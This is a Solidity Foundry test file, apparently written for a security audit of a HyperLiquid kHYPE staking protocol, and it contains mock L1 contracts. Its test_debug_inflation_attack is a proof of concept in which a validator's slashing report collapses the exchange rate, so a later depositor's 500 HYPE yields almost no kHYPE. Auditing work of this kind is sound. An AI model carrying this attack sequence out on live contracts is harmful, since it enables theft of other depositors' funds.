// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Base.t.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {console2 as console} from "forge-std/console2.sol";
import {DefaultOracle} from "../src/oracles/DefaultOracle.sol";
import {OracleAdapter} from "../src/oracles/DefaultAdapter.sol";

contract DebugTest is BaseTest {
    // address user = makeAddr("user");
    MockL1_HYPE_CONTRACT mockL1Core = MockL1_HYPE_CONTRACT(payable(0x2222222222222222222222222222222222222222));
    MockL1_WRITE_CONTRACT writeContract = MockL1_WRITE_CONTRACT(0x3333333333333333333333333333333333333333);

    address validator = makeAddr("validator");
    DefaultOracle oracle;
    OracleAdapter oracleAdapter;

    function setUp() public override {
        super.setUp();
        // Override L1Write with MockL1Write. To simulate L1 balance and calls
        // not using actual fork for HyperLiquid L1,L2 EVM
        vm.etch(address(0x2222222222222222222222222222222222222222), address(new MockL1_HYPE_CONTRACT()).code);
        vm.etch(address(0x3333333333333333333333333333333333333333), address(new MockL1_WRITE_CONTRACT()).code);

        //update manager config
        vm.startPrank(manager);
        stakingManager.setMaxStakeAmount(1000 ether);
        stakingManager.setStakingLimit(0);
        validatorManager.activateValidator(validator);
        validatorManager.setDelegation(address(stakingManager), validator);

        assertEq(mockL1Core.decimals(), 8); // L1 HYPE have 8 decimals

        // create default oracle
        oracle = new DefaultOracle(manager, operator);
        oracleAdapter = new OracleAdapter(address(oracle));
        oracleManager.authorizeOracleAdapter(address(oracleAdapter));
        oracleManager.setOracleActive(address(oracleAdapter), true);
        oracleManager.setMinUpdateInterval(1 hours);

        vm.stopPrank();
        skip(1 hours);
    }

    //@dev Inflation attack leads by validator on L1 and oracle report every 1 hour.
    function test_debug_inflation_attack() public {
        // Exploiter here is the same as malicious validator
        address exploiter = makeAddr("exploiter");
        deal(exploiter, 1000 ether);

        vm.startPrank(exploiter);
        //minium deposit is 0.1 ether. big enough to prevent inflation attack
        uint256 depositValue = 0.1e18 / 1e10 * 1e10;
        stakingManager.stake{value: depositValue}();
        console.log("kHYPE balance: %e", kHYPE.balanceOf(exploiter));
        console.log("HYPE:kHYPE exchange rate: %e", stakingAccountant.HYPEToKHYPE(1e18));

        // Valid Validator must have minimum 10,000 HYPE balance on L1 HyperCore.
        // Assume they manage to get themself penalty by double signing blocks or other means.

        console.log("--inflation attack--");
        vm.startPrank(operator);
        // Oracle Operator update metric performance every 1 hour
        // assume slashing penalty allowed it to become exact tiny value. down to wei
        oracle.updateValidatorMetrics(validator, 10000 ether, 10000, 10000, 9000, 10000, 0, depositValue - 1 wei);
        // Generate performance every 1 hour read from default oracle
        oracleManager.generatePerformance(validator);

        // //Exchange rate now reduced to zero
        // console.log("1e18 HYPE = %e kHYPE", stakingAccountant.HYPEToKHYPE(1e18));

        // console.log("--mint free kHYPE--");
        // vm.startPrank(exploiter);
        // stakingManager.stake{value: 1 ether}();
        // console.log("kHYPE balance: %e", kHYPE.balanceOf(exploiter));
        // console.log("HYPE:kHYPE exchange rate: %e", stakingAccountant.HYPEToKHYPE(1e18));
        console.log("1e18 kHYPE = %e HYPE", stakingAccountant.kHYPEToHYPE(1e18));
        console.log("1e18 kHYPE = %e HYPE", stakingAccountant.kHYPEToHYPE(0.1e18));

        address user2 = makeAddr("user2");
        vm.startPrank(user2);
        deal(user2, 500 ether);
        stakingManager.stake{value: 500 ether}();
        console.log("user2 kHYPE balance: %e", kHYPE.balanceOf(user2));
        console.log("user2 swap all kHYPE for: %e HYPE", stakingAccountant.kHYPEToHYPE(kHYPE.balanceOf(user2)));

        //Now exploiter only have to queue withdrawal and wait 7 days to claim all HYPE from L2 EVM
        vm.startPrank(exploiter);
        // stakingManager.queueWithdrawal(stakingAccountant.HYPEToKHYPE(1000e18)); // queue withdrawal

    }

    function _logging() internal {
        console.log("totalStake: %e", stakingAccountant.totalStaked());
        console.log("totalClaimed: %e", stakingAccountant.totalClaimed());

        console.log("StakingManager L1 Hype: %e", mockL1Core.balanceOf(address(stakingManager)));
        console.log("StakingManager L1 staked: %e", mockL1Core.stakingBalance(address(stakingManager)));
        console.log("validator L1 delegating power: %e", mockL1Core.stakingBalance(address(validator)));
    }

    function _processAllL1Operations() internal {
        vm.startPrank(operator);
        console.log("--execute all pending operations--");
        stakingManager.processL1Operations(0); // process all L1 operations
        vm.stopPrank();
    }
}

contract MockL1_HYPE_CONTRACT is ERC20("Mock L1 HYPE", "L1 HYPE") {
    // etched on 0x2222222222222222222222222222222222222222
    mapping(address => uint256) public stakingBalance; //L1 staking balance
    uint256 public totalStaked; //L1 staking balance

    receive() external payable {
        //https://app.hyperliquid.xyz/explorer/token/0x0d01dc56dcaaca66ad901c959b4011ec
        _mint(msg.sender, msg.value / 1e10); //L1 have 8 decimals for HYPE
    }

    function decimals() public view override returns (uint8) {
        return 8;
    }

    //type: cDeposit
    function stake(address user, uint256 amount) public {
        _burn(user, amount); //L1 burn HYPE to simulate deposit to staking account
        stakingBalance[user] += amount;
        totalStaked += amount;
    }

    //type: cWithdraw
    function unstake(address user, uint256 amount) public {
        stakingBalance[user] -= amount;
        totalStaked -= amount;
        _mint(user, amount); //L1 mint HYPE to simulate withdraw from staking account
    }

    // type: tokenDelegate
    function delegate(address user, address validator, uint256 amount, bool isUndelegate) public {
        //to simulate delegation. the best way simply transfer staking power to target address. Not correct way, but good enough for mock
        if (isUndelegate) {
            require(stakingBalance[validator] >= amount, "Validator not enough staking balance to undelegate");
            stakingBalance[user] += amount;
            stakingBalance[validator] -= amount;
        } else {
            // delegate to validator
            require(stakingBalance[user] >= amount, "user not enough staking balance to delegate");
            stakingBalance[user] -= amount;
            stakingBalance[validator] += amount;
        }
    }

    function _update(address from, address to, uint256 value) internal override {
        //@dev ignore staking balance from being transferred. This is just a mock. no use case for something already check on L1 mainnet
        super._update(from, to, value);
    }
}

contract MockL1_WRITE_CONTRACT {
    // etched on 0x3333333333333333333333333333333333333333
    MockL1_HYPE_CONTRACT public immutable mockL1Core =
        MockL1_HYPE_CONTRACT(payable(0x2222222222222222222222222222222222222222));

    event TokenDelegate(address indexed user, address indexed validator, uint64 _wei, bool isUndelegate);
    event CDeposit(address indexed user, uint64 _wei);
    event CWithdrawal(address indexed user, uint64 _wei);
    event SpotSend(address indexed user, address indexed destination, uint64 token, uint64 _wei);

    function sendTokenDelegate(address validator, uint64 _wei, bool isUndelegate) external {
        emit TokenDelegate(msg.sender, validator, _wei, isUndelegate); //@Delegate or undelegate stake from validator
        //@dev ignore possible not enough token to delegate on L1. This is just a mock. Out of balance is a bug that will be reported through testing.
        mockL1Core.delegate(msg.sender, validator, _wei, isUndelegate); //@L1 move HYPE balance to staking balance
    }

    function sendCDeposit(uint64 _wei) external {
        emit CDeposit(msg.sender, _wei); //@deposit into staking
        mockL1Core.stake(msg.sender, _wei); //@L1 move HYPE balance to staking balance
            // console.log("sendCDeposit: ", msg.sender,_wei);
    }

    function sendCWithdrawal(uint64 _wei) external {
        emit CWithdrawal(msg.sender, _wei); //@Withdraw from staking
        mockL1Core.unstake(msg.sender, _wei); //@L1 unstake and get HYPE back to user
    }

    function sendSpot(address destination, uint64 token, uint64 _wei) external {
        emit SpotSend(msg.sender, destination, token, _wei); //Core spot transfer , L1 asset token, to L1 address,
    }
}
